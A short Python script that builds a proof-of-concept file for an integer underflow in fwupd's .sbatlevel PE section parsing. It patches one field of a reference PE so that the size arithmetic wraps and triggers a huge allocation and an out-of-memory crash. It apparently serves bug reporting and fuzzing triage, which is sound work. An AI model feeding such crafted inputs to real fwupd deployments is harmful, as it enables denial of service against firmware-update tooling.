#!/usr/bin/env python3
"""Generate PoC for fwupd-sbatlevel-underflow (issue #9659).

The fwupd test corpus already ships a well-formed 600-byte PE32+ with
a `.sbatlevel` section (libfwupdplugin/tests/sbatlevel.builder.xml ->
.ossfuzz/pefile.bin). We patch the `previous` field at offset 0x21c
from 8 to 40 so it exceeds the 28-byte section payload — fwupd's
fu_sbatlevel_section_add_entry() then computes (28 - 44) as unsigned
size_t and downstream tries to allocate ~2 GiB → libFuzzer OOM.

The reference 600-byte PE is committed at poc/ref-pefile.bin to keep
this script self-contained.
"""
from pathlib import Path

REF = Path(__file__).parent / 'ref-pefile.bin'

def create_poc(output='poc.bin'):
    poc = bytearray(REF.read_bytes())
    poc[0x21c:0x220] = (40).to_bytes(4, 'little')
    with open(output, 'wb') as f:
        f.write(bytes(poc))
    print(f"wrote {output} ({len(poc)} bytes)")

if __name__ == '__main__':
    create_poc()
